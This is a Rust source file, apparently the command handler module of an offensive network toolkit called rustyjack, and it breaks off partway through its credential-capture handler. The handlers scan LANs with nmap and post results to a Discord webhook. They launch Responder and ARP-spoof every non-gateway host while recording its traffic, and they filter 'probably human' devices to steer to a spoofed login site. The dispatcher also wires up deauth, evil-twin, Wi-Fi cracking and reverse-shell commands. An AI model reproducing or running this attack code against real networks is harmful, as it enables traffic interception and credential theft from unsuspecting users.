use std::{
    fs,
    io::{BufRead, BufReader, Write},
    net::Ipv4Addr,
    path::{Path, PathBuf},
    process::Command,
    time::{Duration, SystemTime, UNIX_EPOCH},
};

use anyhow::{anyhow, bail, Context, Result};
use chrono::Local;
use ipnet::Ipv4Net;
use regex::Regex;
use rustyjack_ethernet::{
    build_device_inventory, discover_hosts, discover_hosts_arp, quick_port_scan, DeviceInfo,
    LanDiscoveryResult,
};
use rustyjack_evasion::{
    MacAddress, MacManager, MacMode, MacPolicyConfig, MacPolicyEngine, MacStage, StableScope,
    VendorPolicy,
};
use rustyjack_wireless::{
    arp_scan, calculate_bandwidth, discover_gateway, discover_mdns_devices, get_traffic_stats,
    parse_dns_query, scan_network_services, start_dns_capture, start_hotspot, status_hotspot,
    stop_hotspot, HotspotConfig, HotspotState,
};
use serde_json::{json, Value};
use walkdir::WalkDir;

use crate::cli::{
    BridgeCommand, BridgeStartArgs, BridgeStopArgs, Commands, DiscordCommand, DiscordSendArgs,
    DnsSpoofCommand, DnsSpoofStartArgs, EthernetCommand, EthernetDiscoverArgs,
    EthernetInventoryArgs, EthernetPortScanArgs, EthernetSiteCredArgs, HardwareCommand,
    HotspotCommand, HotspotStartArgs, LootCommand, LootKind, LootListArgs, LootReadArgs,
    MitmCommand, MitmStartArgs, NotifyCommand, ProcessCommand, ProcessKillArgs, ProcessStatusArgs,
    ResponderArgs, ResponderCommand, ReverseCommand, ReverseLaunchArgs, ScanCommand, ScanRunArgs,
    StatusCommand, SystemCommand, SystemFdeMigrateArgs, SystemFdePrepareArgs, SystemUpdateArgs,
    WifiBestArgs, WifiCommand, WifiCrackArgs, WifiDeauthArgs, WifiDisconnectArgs, WifiEvilTwinArgs,
    WifiKarmaArgs, WifiPmkidArgs, WifiProbeSniffArgs, WifiProfileCommand, WifiProfileConnectArgs,
    WifiProfileDeleteArgs, WifiProfileSaveArgs, WifiReconArpScanArgs, WifiReconBandwidthArgs,
    WifiReconCommand, WifiReconDnsCaptureArgs, WifiReconGatewayArgs, WifiReconMdnsScanArgs,
    WifiReconServiceScanArgs, WifiRouteCommand, WifiRouteEnsureArgs, WifiRouteMetricArgs,
    WifiScanArgs, WifiStatusArgs, WifiSwitchArgs,
};
#[cfg(target_os = "linux")]
use crate::netlink_helpers::netlink_set_interface_up;
use crate::system::{
    append_payload_log, backup_repository, backup_routing_state, build_loot_path,
    build_manual_embed, build_mitm_pcap_path, compose_status_text, connect_wifi_network,
    default_gateway_ip, delete_wifi_profile, detect_ethernet_interface, detect_interface,
    disconnect_wifi_interface, enable_ip_forwarding, enforce_single_interface,
    find_interface_by_mac, git_reset_to_remote, interface_gateway, kill_process,
    kill_process_pattern, list_interface_summaries, list_wifi_profiles, load_wifi_profile,
    log_mac_usage, ping_host, process_running_exact, process_running_pattern, randomize_hostname,
    read_default_route, read_discord_webhook, read_dns_servers, read_interface_preference,
    read_interface_preference_with_mac, read_interface_stats, read_wifi_link_info,
    restart_system_service, restore_routing_state, rewrite_dns_servers, rewrite_ettercap_dns,
    sanitize_label, save_wifi_profile, scan_local_hosts, scan_wifi_networks, select_best_interface,
    select_wifi_interface, send_discord_payload, send_scan_to_discord, set_default_route,
    set_interface_metric, spawn_arpspoof_pair, start_bridge_pair, start_ettercap, start_php_server,
    start_tcpdump_capture, stop_bridge_pair, strip_nmap_header, write_interface_preference,
    write_wifi_profile, HostInfo, KillResult, WifiProfile,
};

pub type HandlerResult = (String, Value);

fn get_active_interface(root: &Path) -> Result<Option<String>> {
    read_interface_preference(root, "system_preferred")
}

#[allow(dead_code)]
fn validate_and_enforce_interface(
    root: &Path,
    requested: Option<&str>,
    allow_multi: bool,
) -> Result<String> {
    let active = get_active_interface(root)?;

    match (requested, active.as_deref()) {
        (Some(req), Some(act)) if req != act && !allow_multi => {
            bail!(
                "Interface mismatch: requested '{}' but active interface is '{}'. Use 'wifi route ensure' to switch.",
                req,
                act
            );
        }
        (Some(req), _) => {
            if !allow_multi {
                enforce_single_interface(req)?;
            }
            Ok(req.to_string())
        }
        (None, Some(act)) => {
            if !allow_multi {
                enforce_single_interface(&act)?;
            }
            Ok(act.to_string())
        }
        (None, None) => {
            bail!("No active interface set. Run 'hardware detect' and 'wifi route ensure' first.");
        }
    }
}

pub fn dispatch_command(root: &Path, command: Commands) -> Result<HandlerResult> {
    match command {
        Commands::Scan(ScanCommand::Run(args)) => handle_scan_run(root, args),
        Commands::Notify(NotifyCommand::Discord(sub)) => match sub {
            DiscordCommand::Send(args) => handle_discord_send(root, args),
            DiscordCommand::Status => handle_discord_status(root),
        },
        Commands::Responder(sub) => match sub {
            ResponderCommand::On(args) => handle_responder_on(root, args),
            ResponderCommand::Off => handle_responder_off(),
        },
        Commands::Mitm(sub) => match sub {
            MitmCommand::Start(args) => handle_mitm_start(root, args),
            MitmCommand::Stop => handle_mitm_stop(),
        },
        Commands::DnsSpoof(sub) => match sub {
            DnsSpoofCommand::Start(args) => handle_dnsspoof_start(root, args),
            DnsSpoofCommand::Stop => handle_dnsspoof_stop(),
        },
        Commands::Wifi(sub) => match sub {
            WifiCommand::List => handle_wifi_list(),
            WifiCommand::Status(args) => handle_wifi_status(root, args),
            WifiCommand::Best(args) => handle_wifi_best(root, args),
            WifiCommand::Switch(args) => handle_wifi_switch(root, args),
            WifiCommand::Scan(args) => handle_wifi_scan(root, args),
            WifiCommand::Profile(profile) => match profile {
                WifiProfileCommand::List => handle_wifi_profile_list(root),
                WifiProfileCommand::Save(args) => handle_wifi_profile_save(root, args),
                WifiProfileCommand::Connect(args) => handle_wifi_profile_connect(root, args),
                WifiProfileCommand::Delete(args) => handle_wifi_profile_delete(root, args),
            },
            WifiCommand::Disconnect(args) => handle_wifi_disconnect(args),
            WifiCommand::Route(route) => match route {
                WifiRouteCommand::Status => handle_wifi_route_status(root),
                WifiRouteCommand::Ensure(args) => handle_wifi_route_ensure(root, args),
                WifiRouteCommand::Backup => handle_wifi_route_backup(root),
                WifiRouteCommand::Restore => handle_wifi_route_restore(root),
                WifiRouteCommand::SetMetric(args) => handle_wifi_route_metric(args),
            },
            WifiCommand::Deauth(args) => handle_wifi_deauth(root, args),
            WifiCommand::EvilTwin(args) => handle_wifi_evil_twin(root, args),
            WifiCommand::PmkidCapture(args) => handle_wifi_pmkid(root, args),
            WifiCommand::ProbeSniff(args) => handle_wifi_probe_sniff(root, args),
            WifiCommand::Crack(args) => handle_wifi_crack(root, args),
            WifiCommand::Karma(args) => handle_wifi_karma(root, args),
            WifiCommand::Recon(recon) => match recon {
                WifiReconCommand::Gateway(args) => handle_wifi_recon_gateway(args),
                WifiReconCommand::ArpScan(args) => handle_wifi_recon_arp_scan(args),
                WifiReconCommand::ServiceScan(args) => handle_wifi_recon_service_scan(args),
                WifiReconCommand::MdnsScan(args) => handle_wifi_recon_mdns_scan(args),
                WifiReconCommand::Bandwidth(args) => handle_wifi_recon_bandwidth(args),
                WifiReconCommand::DnsCapture(args) => handle_wifi_recon_dns_capture(args),
            },
        },
        Commands::Loot(sub) => match sub {
            LootCommand::List(args) => handle_loot_list(root, args),
            LootCommand::Read(args) => handle_loot_read(root, args),
        },
        Commands::Process(sub) => match sub {
            ProcessCommand::Kill(args) => handle_process_kill(args),
            ProcessCommand::Status(args) => handle_process_status(args),
        },
        Commands::Status(StatusCommand::Summary) => handle_status_summary(),
        Commands::Status(StatusCommand::Network) => handle_network_status(),
        Commands::Reverse(ReverseCommand::Launch(args)) => handle_reverse_launch(root, args),
        Commands::System(SystemCommand::Update(args)) => handle_system_update(root, args),
        Commands::System(SystemCommand::RandomizeHostname) => handle_randomize_hostname(),
        Commands::System(SystemCommand::FdePrepare(args)) => handle_system_fde_prepare(root, args),
        Commands::System(SystemCommand::FdeMigrate(args)) => handle_system_fde_migrate(root, args),
        Commands::Bridge(sub) => match sub {
            BridgeCommand::Start(args) => handle_bridge_start(root, args),
            BridgeCommand::Stop(args) => handle_bridge_stop(root, args),
        },

        Commands::Hardware(cmd) => match cmd {
            HardwareCommand::Detect => handle_hardware_detect(),
        },
        Commands::Ethernet(sub) => match sub {
            EthernetCommand::Discover(args) => handle_eth_discover(root, args),
            EthernetCommand::PortScan(args) => handle_eth_port_scan(root, args),
            EthernetCommand::Inventory(args) => handle_eth_inventory(root, args),
            EthernetCommand::SiteCredCapture(args) => handle_eth_site_cred_capture(root, args),
        },
        Commands::Hotspot(sub) => match sub {
            HotspotCommand::Start(args) => handle_hotspot_start(args),
            HotspotCommand::Stop => handle_hotspot_stop(),
            HotspotCommand::Status => handle_hotspot_status(),
        },
    }
}

fn handle_scan_run(root: &Path, args: ScanRunArgs) -> Result<HandlerResult> {
    run_scan_with_progress(root, args, |_, _| {})
}

#[cfg(target_os = "linux")]
fn run_arp_discovery(
    interface: &str,
    net: Ipv4Net,
    rate_limit_pps: Option<u32>,
    timeout: Duration,
) -> Result<LanDiscoveryResult> {
    match tokio::runtime::Handle::try_current() {
        Ok(handle) => handle.block_on(async {
            discover_hosts_arp(interface, net, rate_limit_pps, timeout).await
        }),
        Err(_) => {
            let rt = tokio::runtime::Runtime::new().context("creating tokio runtime for ARP")?;
            rt.block_on(async { discover_hosts_arp(interface, net, rate_limit_pps, timeout).await })
        }
    }
}

#[cfg(not(target_os = "linux"))]
fn run_arp_discovery(
    interface: &str,
    net: Ipv4Net,
    rate_limit_pps: Option<u32>,
    timeout: Duration,
) -> Result<LanDiscoveryResult> {
    discover_hosts_arp(interface, net, rate_limit_pps, timeout)
}

fn handle_eth_discover(root: &Path, args: EthernetDiscoverArgs) -> Result<HandlerResult> {
    let interface = detect_ethernet_interface(args.interface.clone())?;

    enforce_single_interface(&interface.name)?;

    let cidr = args
        .target
        .clone()
        .unwrap_or_else(|| interface.network_cidr());
    let net: Ipv4Net = cidr.parse().context("parsing target CIDR")?;

    let timeout = Duration::from_millis(args.timeout_ms.max(50));
    let mut hosts_detail = Vec::new();
    if let Ok(arp_result) = run_arp_discovery(&interface.name, net, Some(50), timeout) {
        hosts_detail.extend(arp_result.details);
    }
    if let Ok(icmp_result) = discover_hosts(net, timeout) {
        hosts_detail.extend(icmp_result.details);
    }
    let mut seen = std::collections::HashSet::new();
    let mut deduped = Vec::new();
    for h in hosts_detail {
        if seen.insert(h.ip) {
            deduped.push(h);
        }
    }
    let hosts: Vec<Ipv4Addr> = deduped.iter().map(|h| h.ip).collect();

    let loot_dir = root.join("loot").join("Ethernet");
    fs::create_dir_all(&loot_dir).context("creating loot/Ethernet")?;
    let timestamp = Local::now().format("%Y%m%d_%H%M%S");
    let file = loot_dir.join(format!("discovery_{}_{}.txt", net, timestamp));
    let mut out = String::new();
    out.push_str(&format!("LAN Discovery on {}\n", net));
    out.push_str(&format!("Interface: {}\n", interface.name));
    out.push_str(&format!("Timeout: {:?}\n", timeout));
    out.push_str("\nHosts:\n");
    for host in &deduped {
        let ttl_txt = host.ttl.map(|t| format!(" ttl={}", t)).unwrap_or_default();
        let os_guess = rustyjack_ethernet::guess_os_from_ttl(host.ttl)
            .map(|s| format!(" os={}", s))
            .unwrap_or_default();
        let method = match host.method {
            rustyjack_ethernet::DiscoveryMethod::Icmp => "icmp",
            rustyjack_ethernet::DiscoveryMethod::Arp => "arp",
        };
        out.push_str(&format!(
            "{} [{}]{}{}\n",
            host.ip, method, ttl_txt, os_guess
        ));
    }
    fs::write(&file, out).with_context(|| format!("writing {}", file.display()))?;

    let _ = log_mac_usage(
        root,
        &interface.name,
        "ethernet_discover",
        Some(&sanitize_label(&net.to_string())),
    );

    let log_file = write_scoped_log(
        root,
        "Ethernet",
        &net.to_string(),
        "Discovery",
        "discovery",
        &[
            format!("LAN discovery on {}", net),
            format!("Interface: {}", interface.name),
            format!("Timeout: {:?}", timeout),
            format!("Hosts found: {}", hosts.len()),
            format!("Output: {}", file.display()),
        ],
    )
    .map(|p| p.display().to_string());

    let data = json!({
        "network": net.to_string(),
        "interface": interface.name,
        "hosts_found": hosts,
        "hosts_detail": deduped.iter().map(|h| {
            json!({
                "ip": h.ip.to_string(),
                "method": match h.method {
                    rustyjack_ethernet::DiscoveryMethod::Icmp => "icmp",
                    rustyjack_ethernet::DiscoveryMethod::Arp => "arp",
                },
                "ttl": h.ttl,
                "os_guess": rustyjack_ethernet::guess_os_from_ttl(h.ttl),
            })
        }).collect::<Vec<_>>(),
        "loot_path": file.display().to_string(),
        "log_file": log_file,
    });
    Ok((
        format!("LAN discovery complete ({} hosts)", hosts.len()),
        data,
    ))
}

fn handle_eth_port_scan(root: &Path, args: EthernetPortScanArgs) -> Result<HandlerResult> {
    let interface = detect_ethernet_interface(args.interface.clone())?;
    let target: std::net::Ipv4Addr = if let Some(t) = args.target.as_ref() {
        t.parse().context("parsing target IPv4")?
    } else if let Some(gw) = interface_gateway(&interface.name)? {
        gw
    } else {
        bail!("No target provided and no gateway found");
    };

    let ports: Vec<u16> = if let Some(list) = args.ports.as_ref() {
        list.split(',')
            .filter_map(|p| p.trim().parse::<u16>().ok())
            .collect()
    } else {
        vec![
            22, 80, 443, 53, 445, 3389, 8080, 8000, 8443, 21, 23, 25, 110, 143,
        ]
    };

    if ports.is_empty() {
        bail!("No ports provided for scan");
    }

    let timeout = Duration::from_millis(args.timeout_ms.max(50));
    let result = quick_port_scan(target, &ports, timeout).context("running port scan")?;

    // Save loot
    let loot_dir = root.join("loot").join("Ethernet");
    fs::create_dir_all(&loot_dir).context("creating loot/Ethernet")?;
    let timestamp = Local::now().format("%Y%m%d_%H%M%S");
    let file = loot_dir.join(format!("portscan_{}_{}.txt", target, timestamp));
    let mut out = String::new();
    out.push_str(&format!("Port scan on {}\n", target));
    out.push_str(&format!("Timeout: {:?}\n", timeout));
    out.push_str("Ports tested:\n");
    out.push_str(&format!("{:?}\n\n", ports));
    out.push_str("Open ports:\n");
    for p in &result.open_ports {
        out.push_str(&format!("{}\n", p));
    }
    if !result.banners.is_empty() {
        out.push_str("\nBanners:\n");
        for b in &result.banners {
            out.push_str(&format!("{} [{}]: {}\n", b.port, b.probe, b.banner));
        }
    }
    fs::write(&file, out).with_context(|| format!("writing {}", file.display()))?;

    let _ = log_mac_usage(
        root,
        &interface.name,
        "ethernet_portscan",
        Some(&sanitize_label(&target.to_string())),
    );

    let data = json!({
        "target": target.to_string(),
        "open_ports": result.open_ports,
        "banners": result.banners.iter().map(|b| {
            json!({
                "port": b.port,
                "probe": b.probe,
                "banner": b.banner,
            })
        }).collect::<Vec<_>>(),
        "loot_path": file.display().to_string(),
    });
    let log_file = write_scoped_log(
        root,
        "Ethernet",
        &target.to_string(),
        "PortScan",
        "portscan",
        &[
            format!("Port scan on {}", target),
            format!("Interface: {}", interface.name),
            format!("Timeout: {:?} per port", timeout),
            format!("Ports tested: {}", ports.len()),
            format!("Open ports: {}", result.open_ports.len()),
        ],
    )
    .map(|p| p.display().to_string());
    let data = {
        let mut base = data;
        if let Some(log) = log_file {
            base.as_object_mut()
                .map(|obj| obj.insert("log_file".to_string(), json!(log)));
        }
        base
    };
    Ok((
        format!("Port scan complete ({} open)", result.open_ports.len()),
        data,
    ))
}

fn handle_eth_inventory(root: &Path, args: EthernetInventoryArgs) -> Result<HandlerResult> {
    let interface = detect_ethernet_interface(args.interface.clone())?;
    let cidr = args
        .target
        .clone()
        .unwrap_or_else(|| interface.network_cidr());
    let net: Ipv4Net = cidr.parse().context("parsing target CIDR")?;

    let timeout = Duration::from_millis(args.timeout_ms.max(200));

    // Combine ARP and ICMP to find hosts
    let mut details = Vec::new();
    if let Ok(arp) = run_arp_discovery(&interface.name, net, Some(50), timeout) {
        details.extend(arp.details);
    }
    if let Ok(icmp) = discover_hosts(net, timeout) {
        for d in icmp.details {
            if !details.iter().any(|h| h.ip == d.ip) {
                details.push(d);
            }
        }
    }
    let hosts: Vec<Ipv4Addr> = details
        .iter()
        .map(|d| d.ip)
        .collect::<std::collections::HashSet<_>>()
        .into_iter()
        .collect();

    let discovery = LanDiscoveryResult {
        network: net,
        hosts: hosts.clone(),
        details: details.clone(),
    };

    let default_ports = vec![22, 80, 443, 445, 139, 3389, 53, 8080, 8000, 8443];
    let devices = build_device_inventory(&discovery, &default_ports, timeout)?;

    // Save loot under per-network directory
    let target_name = net
        .to_string()
        .replace(|c: char| !c.is_alphanumeric() && c != '-' && c != '_', "_");
    let loot_dir = root.join("loot").join("Ethernet").join(&target_name);
    fs::create_dir_all(&loot_dir).context("creating loot/Ethernet")?;
    let timestamp = chrono::Local::now().format("%Y%m%d_%H%M%S");
    let path = loot_dir.join(format!("inventory_{}.json", timestamp));

    let serializable: Vec<Value> = devices
        .iter()
        .map(|d| {
            json!({
                "ip": d.ip.to_string(),
                "hostname": d.hostname,
                "os_hint": d.os_hint,
                "ttl": d.ttl,
                "open_ports": d.open_ports,
                "banners": d.banners.iter().map(|b| {
                    json!({
                        "port": b.port,
                        "probe": b.probe,
                        "banner": b.banner,
                    })
                }).collect::<Vec<_>>(),
                "services": d.services.iter().map(|s| {
                    json!({
                        "protocol": s.protocol,
                        "detail": s.detail,
                    })
                }).collect::<Vec<_>>(),
            })
        })
        .collect();

    let log_file = write_scoped_log(
        root,
        "Ethernet",
        &net.to_string(),
        "Inventory",
        "inventory",
        &[
            format!("Inventory on {}", net),
            format!("Interface: {}", interface.name),
            format!("Hosts discovered: {}", hosts.len()),
            format!("Devices profiled: {}", devices.len()),
            format!("Output: {}", path.display()),
        ],
    )
    .map(|p| p.display().to_string());

    let output = json!({
        "interface": interface.name,
        "network": net.to_string(),
        "hosts_found": hosts.len(),
        "devices": serializable,
        "loot_file": path.display().to_string(),
        "log_file": log_file,
    });

    fs::write(&path, serde_json::to_vec_pretty(&serializable)?)
        .with_context(|| format!("writing {}", path.display()))?;

    let _ = log_mac_usage(
        root,
        &interface.name,
        "ethernet_inventory",
        Some(&sanitize_label(&net.to_string())),
    );

    Ok((
        format!("Inventory complete ({} device(s))", devices.len()),
        output,
    ))
}

fn handle_hotspot_start(args: HotspotStartArgs) -> Result<HandlerResult> {
    use crate::system::apply_interface_isolation;

    log::info!(
        "[CORE] Hotspot start requested ap_interface={} upstream_interface={} ssid={} channel={}",
        args.ap_interface,
        args.upstream_interface,
        args.ssid,
        args.channel
    );

    let cfg = HotspotConfig {
        ap_interface: args.ap_interface.clone(),
        upstream_interface: args.upstream_interface.clone(),
        ssid: args.ssid,
        password: args.password,
        channel: args.channel,
    };

    // Start hotspot FIRST (it handles interface configuration and rfkill)
    let state = start_hotspot(cfg).context("starting hotspot")?;

    // Now apply interface isolation to block other interfaces
    // This runs AFTER hotspot is up to avoid interfering with startup
    let mut allowed_interfaces = vec![args.ap_interface.clone()];
    if !args.upstream_interface.is_empty() {
        allowed_interfaces.push(args.upstream_interface.clone());
    }

    // Best-effort isolation - don't fail hotspot if isolation fails
    if let Err(e) = apply_interface_isolation(&allowed_interfaces) {
        log::warn!("Interface isolation failed: {}", e);
    }

    log::info!(
        "[CORE] Hotspot start completed running=true ap={} upstream={}",
        state.ap_interface,
        state.upstream_interface
    );

    let data = json!({
        "running": true,
        "ssid": state.ssid,
        "password": state.password,
        "ap_interface": state.ap_interface,
        "upstream_interface": state.upstream_interface,
        "channel": state.channel,
        "upstream_ready": state.upstream_ready,
        "isolation_enforced": true,
        "interfaces_allowed": allowed_interfaces,
    });
    Ok(("Hotspot started".to_string(), data))
}

fn handle_hotspot_stop() -> Result<HandlerResult> {
    log::info!("[CORE] Hotspot stop requested");
    stop_hotspot().context("stopping hotspot")?;
    let data = json!({ "running": false });
    log::info!("[CORE] Hotspot stop completed");
    Ok(("Hotspot stopped".to_string(), data))
}

fn handle_hotspot_status() -> Result<HandlerResult> {
    log::debug!("[CORE] Hotspot status requested");
    if let Some(HotspotState {
        ssid,
        password,
        ap_interface,
        upstream_interface,
        channel,
        upstream_ready,
        ..
    }) = status_hotspot()
    {
        log::debug!(
            "[CORE] Hotspot status running ap={} upstream={}",
            ap_interface,
            upstream_interface
        );
        let data = json!({
            "running": true,
            "ssid": ssid,
            "password": password,
            "ap_interface": ap_interface,
            "upstream_interface": upstream_interface,
            "channel": channel,
            "upstream_ready": upstream_ready,
        });
        Ok(("Hotspot running".to_string(), data))
    } else {
        log::debug!("[CORE] Hotspot status not running");
        let data = json!({ "running": false });
        Ok(("Hotspot not running".to_string(), data))
    }
}

pub fn run_scan_with_progress<F>(
    root: &Path,
    args: ScanRunArgs,
    mut on_progress: F,
) -> Result<HandlerResult>
where
    F: FnMut(f32, &str),
{
    let ScanRunArgs {
        label,
        nmap_args,
        interface,
        target,
        output_path,
        no_discord,
    } = args;

    let interface_info = detect_interface(interface)?;
    let target = target.unwrap_or_else(|| interface_info.network_cidr());

    let loot_path = output_path.unwrap_or(build_loot_path(root, &label)?);
    if let Some(parent) = loot_path.parent() {
        std::fs::create_dir_all(parent).context("creating loot directory")?;
    }

    let mut cmd = std::process::Command::new("nmap");
    if !nmap_args.is_empty() {
        cmd.args(&nmap_args);
    }

    // Add stats-every to get progress updates
    cmd.arg("--stats-every").arg("1s");

    cmd.arg("-oN")
        .arg(&loot_path)
        .arg("-S")
        .arg(interface_info.address.to_string())
        .arg("-e")
        .arg(&interface_info.name)
        .arg(&target)
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::null())
        .stdin(std::process::Stdio::null());

    let mut child = cmd.spawn().context("failed to launch nmap")?;

    if let Some(stdout) = child.stdout.take() {
        let reader = BufReader::new(stdout);
        // Regex to match: "SYN Stealth Scan Timing: About 15.50% done"
        let re_timing = Regex::new(r"(.*) Timing: About (\d+\.\d+)% done").unwrap();

        for line in reader.lines() {
            if let Ok(line) = line {
                if let Some(caps) = re_timing.captures(&line) {
                    if let (Some(task), Some(pct)) = (caps.get(1), caps.get(2)) {
                        if let Ok(val) = pct.as_str().parse::<f32>() {
                            on_progress(val, task.as_str().trim());
                        }
                    }
                }
            }
        }
    }

    let status = child.wait().context("failed to wait for nmap")?;
    if !status.success() {
        bail!("nmap exited with status {}", status);
    }

    strip_nmap_header(&loot_path)?;

    let mut discord_sent = false;
    if !no_discord {
        discord_sent =
            send_scan_to_discord(root, &label, &loot_path, &target, &interface_info.name)?;
    }

    let output_path_str = loot_path.to_string_lossy().to_string();
    let data = json!({
        "label": label,
        "interface": interface_info.name,
        "target": target,
        "output_path": output_path_str,
        "discord_notified": discord_sent,
    });

    Ok(("Nmap scan completed and loot saved".to_string(), data))
}

fn handle_discord_send(root: &Path, args: DiscordSendArgs) -> Result<HandlerResult> {
    let DiscordSendArgs {
        title,
        message,
        file,
        target,
        interface,
    } = args;

    if message.is_none() && file.is_none() {
        bail!("Either --message or --file must be provided");
    }

    let embed = build_manual_embed(&title, target.as_deref(), interface.as_deref());
    let sent = send_discord_payload(root, Some(embed), file.as_deref(), message.as_deref())?;

    let data = json!({
        "sent": sent,
        "file": file.as_ref().map(|p| p.to_string_lossy().to_string()),
    });

    let message = if sent {
        "Discord notification sent".to_string()
    } else {
        "Discord webhook not configured".to_string()
    };

    Ok((message, data))
}

fn handle_discord_status(root: &Path) -> Result<HandlerResult> {
    let configured = read_discord_webhook(root)?.is_some();
    let data = json!({ "configured": configured });
    let message = if configured {
        "Discord webhook configured".to_string()
    } else {
        "Discord webhook missing".to_string()
    };
    Ok((message, data))
}

fn handle_responder_on(root: &Path, args: ResponderArgs) -> Result<HandlerResult> {
    if process_running_pattern("Responder.py")? {
        let data = json!({ "already_running": true });
        return Ok(("Responder already running".to_string(), data));
    }

    let ResponderArgs { interface } = args;
    let interface = match interface {
        Some(name) => name,
        None => detect_interface(None)?.name,
    };

    enforce_single_interface(&interface)?;

    let responder_script = root.join("Responder/Responder.py");
    if !responder_script.exists() {
        bail!(
            "Responder script not found at {}",
            responder_script.display()
        );
    }

    let mut cmd = std::process::Command::new("python3");
    cmd.arg(&responder_script)
        .arg("-Q")
        .arg("-I")
        .arg(&interface)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null());
    cmd.spawn().context("launching Responder")?;

    let data = json!({
        "interface": interface,
        "isolation_enforced": true,
    });
    Ok(("Responder started".to_string(), data))
}

fn handle_responder_off() -> Result<HandlerResult> {
    match kill_process_pattern("Responder.py")? {
        KillResult::Terminated => {
            let data = json!({ "stopped": true });
            Ok(("Responder stopped".to_string(), data))
        }
        KillResult::NotFound => {
            let data = json!({ "stopped": false });
            Ok(("Responder was not running".to_string(), data))
        }
    }
}

fn handle_mitm_start(root: &Path, args: MitmStartArgs) -> Result<HandlerResult> {
    let MitmStartArgs {
        interface,
        network,
        max_hosts,
        label,
    } = args;
    let interface_info = detect_interface(interface)?;

    enforce_single_interface(&interface_info.name)?;

    let gateway = default_gateway_ip().context("determining default gateway for MITM")?;
    let network = network.unwrap_or_else(|| interface_info.network_cidr());

    let _ = kill_process("arpspoof");
    let _ = kill_process("tcpdump");

    let hosts = scan_local_hosts(&interface_info.name)?;
    let victims: Vec<_> = hosts
        .into_iter()
        .filter(|host| host.ip != gateway)
        .collect();
    if victims.is_empty() {
        bail!("No victims discovered on the local network");
    }

    enable_ip_forwarding(true)?;

    let capped = victims
        .iter()
        .take(max_hosts.max(1))
        .cloned()
        .collect::<Vec<_>>();
    let skipped = victims.len().saturating_sub(capped.len());

    if capped.is_empty() {
        bail!("No victims discovered on the local network");
    }

    for host in &capped {
        spawn_arpspoof_pair(&interface_info.name, gateway, host)?;
    }

    let loot_label = label
        .or_else(|| Some(network.clone()))
        .unwrap_or_else(|| "MITM".to_string());
    let pcap_path = build_mitm_pcap_path(root, Some(&loot_label))?;
    let pcap_display = pcap_path.to_string_lossy().to_string();
    start_tcpdump_capture(&interface_info.name, &pcap_path)?;
    let _ = log_mac_usage(
        root,
        &interface_info.name,
        "ethernet_mitm",
        Some(&sanitize_label(&loot_label)),
    );

    let data = json!({
        "interface": interface_info.name,
        "victim_count": capped.len(),
        "victims_skipped": skipped,
        "gateway": gateway,
        "pcap_path": pcap_display,
        "loot_dir": pcap_path.parent().map(|p| p.to_string_lossy().to_string()),
        "network": network,
        "max_hosts": max_hosts,
        "isolation_enforced": true,
    });

    let _ = write_scoped_log(
        root,
        "Ethernet",
        &network,
        "MITM",
        "mitm",
        &[
            format!("MITM started on {}", network),
            format!("Interface: {}", interface_info.name),
            format!("Victims: {}", capped.len()),
            format!("Gateway: {}", gateway),
            format!("PCAP: {}", pcap_path.display()),
        ],
    );

    Ok(("MITM started".to_string(), data))
}

fn is_probably_human_device(device: &DeviceInfo) -> bool {
    let hostname = device
        .hostname
        .as_deref()
        .unwrap_or("")
        .to_ascii_lowercase();
    let os = device.os_hint.as_deref().unwrap_or("").to_ascii_lowercase();
    let services: String = device
        .services
        .iter()
        .map(|s| s.detail.to_ascii_lowercase())
        .collect::<Vec<_>>()
        .join(" ");

    let avoid_keywords = [
        "router",
        "gateway",
        "printer",
        "nas",
        "camera",
        "cam",
        "switch",
        "ap",
        "uap",
        "unifi",
        "tplink",
        "tp-link",
        "mikrotik",
        "hik",
        "dvr",
        "nvr",
        "tv",
        "roku",
        "fire",
        "chromecast",
        "sonos",
        "esp",
        "shelly",
        "yeelight",
        "tuya",
    ];
    if avoid_keywords
        .iter()
        .any(|k| hostname.contains(k) || os.contains(k) || services.contains(k))
    {
        return false;
    }

    let human_keywords = [
        "iphone", "ipad", "android", "pixel", "samsung", "oneplus", "mac", "macbook", "imac",
        "mbp", "windows", "win", "laptop", "notebook", "thinkpad", "dell", "lenovo", "hp",
        "surface", "pc", "desktop",
    ];
    if human_keywords
        .iter()
        .any(|k| hostname.contains(k) || os.contains(k) || services.contains(k))
    {
        return true;
    }

    // Port-based hints for user endpoints
    let ports = &device.open_ports;
    let human_ports = [
        139u16, 445, 3389, 62078, 62000, 5000, 7000, 7001, 7100, 5353,
    ];
    if human_ports.iter().any(|p| ports.contains(p)) {
        return true;
    }

    // Heuristic TTL: very high TTL likely infra, mid/low may be user endpoints.
    if let Some(ttl) = device.ttl {
        if ttl >= 240 {
            return false;
        }
        if ttl >= 32 {
            return true;
        }
    }

    false
}

fn handle_eth_site_cred_capture(root: &Path, args: EthernetSiteCredArgs) -> Result<HandlerResult> {
    let EthernetSiteCredArgs {
        interface,
        target,
        site,
        max_hosts,
        timeout_ms,
    } = args;

    let site_dir = root.join("DNSSpoof").join("sites").join(&site);
    if !site_dir.exists() {
        bail!("DNS spoof site not found: {}", site_dir.display());
    }

    let interface_info = detect_ethernet_interface(interface)?;
    let cidr = target.unwrap_or_else(|| interface_info.network_cidr());
    let net: Ipv4Net = cidr.parse().context("parsing target CIDR")?;

    let timeout = Duration::from_millis(timeout_ms.max(200));

    // Discovery + inventory
    let mut details = Vec::new();
    if let Ok(arp) = run_arp_discovery(&interface_info.name, net, Some(50), timeout) {
        details.extend(arp.details);
    }
    if let Ok(icmp) = discover_hosts(net, timeout) {
        for d in icmp.details {
            if !details.iter().any(|h| h.ip == d.ip) {
                details.push(d);
            }
        }
    }
    let hosts: Vec<Ipv4Addr> = details
        .iter()
        .map(|d| d.ip)
        .collect::<std::collections::HashSet<_>>()
        .into_iter()
        .collect();

    let discovery = LanDiscoveryResult {
        network: net,
        hosts: hosts.clone(),
        details: details.clone(),
    };

    let default_ports = vec![
        22, 80, 443, 445, 139, 3389, 53, 8080, 8000, 8443, 5353, 62078,
    ];
    let devices = build_device_inventory(&discovery, &default_ports, timeout)?;

    let mut human_devices: Vec<DeviceInfo> = devices
        .into_iter()
        .filter(is_probably_human_device)
        .collect();
    if human_devices.is_empty() {
        bail!("No likely human-operated devices detected on the network");
    }

    human_devices.sort_by_key(|d| d.ip);

    let cap = max_hosts.max(1);
    let skipped = human_devices.len().saturating_sub(cap);
    human_devices.truncate(cap);

    // Prepare victims and loot paths
    let victims: Vec<HostInfo> = human_devices
